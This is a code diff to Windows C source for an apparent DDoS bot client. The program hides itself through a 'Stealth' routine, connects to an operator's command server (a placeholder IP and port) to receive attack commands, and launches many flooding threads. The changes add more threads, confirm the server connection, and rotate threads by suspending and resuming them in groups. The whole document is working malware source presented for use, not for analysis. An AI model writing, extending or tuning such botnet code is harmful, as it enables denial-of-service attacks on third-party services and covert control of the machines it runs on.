@@ -5,7 +5,8 @@
 #include <wininet.h>
 #include <string.h>
 #include <time.h>
-#define NUM_THREADS 5    // Define number of threads here or take as user input
+#define NUM_THREADS 10    // Define number of threads here 
+#define THREADS_PERTIME 4 // Define number of threads per time here 
 #pragma comment(lib, "ws2_32.lib")  //Load ws2_32.dll
 
 int hasConnected = 0;
@@ -52,7 +53,7 @@ void DDoS()
             sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //Your server's IP Address
             sockAddr.sin_port = htons(1234); //Your IP Port
 
-            connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
+            int a = connect(sock, (SOCKADDR*)&sockAddr, sizeof(SOCKADDR));
             //Receive the command from server.
             char s[20] = "";
             itoa(count, s, 10);
@@ -66,7 +67,9 @@ void DDoS()
             closesocket(sock);
             //Stop using the DLL.
             WSACleanup();
-            hasConnected = 1;
+            if (a == 0) {
+                hasConnected = 1;
+            }
         }
         //If the server sends the command to the client.
         if (szBuffer[0] != 0) {
@@ -120,10 +123,10 @@ int main() {
     Stealth();
     
     HANDLE* arrayThread;
-    arrayThread = (HANDLE*)malloc(NUM_THREADS * sizeof(int));
+    arrayThread = (HANDLE*)malloc(NUM_THREADS * THREADS_PERTIME * sizeof(int));
     DWORD ThreadId;
     
-    for (int i = 0; i < NUM_THREADS; i++)
+    for (int i = 0; i < NUM_THREADS * THREADS_PERTIME; i++)
     {
         arrayThread[i] = CreateThread(NULL, 0, Thread, (void*)i, 0, &ThreadId);
         //printf("%d\n",arrayThread[i]);
@@ -132,12 +135,36 @@ int main() {
             printf("Create Thread %d get failed. Error no: %d", i, GetLastError);
         }
     }
-
-    WaitForMultipleObjects(NUM_THREADS, arrayThread, TRUE, INFINITE);
+    int n = 0;
+    for (int i = 1; i < NUM_THREADS * THREADS_PERTIME; i++) {
+        SuspendThread(arrayThread[i]);
+    }
+    while (1) {
+        if (n == NUM_THREADS - 1) {
+            for (int i = 0; i < THREADS_PERTIME; i++) {
+                SuspendThread(arrayThread[n * THREADS_PERTIME + i]);//Pause the thread
+            }
+            for (int i = 0; i < THREADS_PERTIME; i++) {
+                ResumeThread(arrayThread[i]);//Run the thread
+            }
+            n = 0;
+        }
+        else {
+            for (int i = 0; i < THREADS_PERTIME; i++) {
+                SuspendThread(arrayThread[n* THREADS_PERTIME + i]);//Pause the thread
+            }
+            for (int i = 0; i < THREADS_PERTIME; i++) {
+                ResumeThread(arrayThread[(n + 1)* THREADS_PERTIME + i]);//Run the thread
+            }
+            n++;
+        }
+        Sleep(50);
+    }
+    WaitForMultipleObjects(NUM_THREADS * THREADS_PERTIME, arrayThread, TRUE, INFINITE);
     DWORD lpExitCode;
     BOOL result;
 
-    for (int i = 0; i < NUM_THREADS; i++)
+    for (int i = 0; i < NUM_THREADS * THREADS_PERTIME; i++)
     {
         CloseHandle(arrayThread[i]);
     }
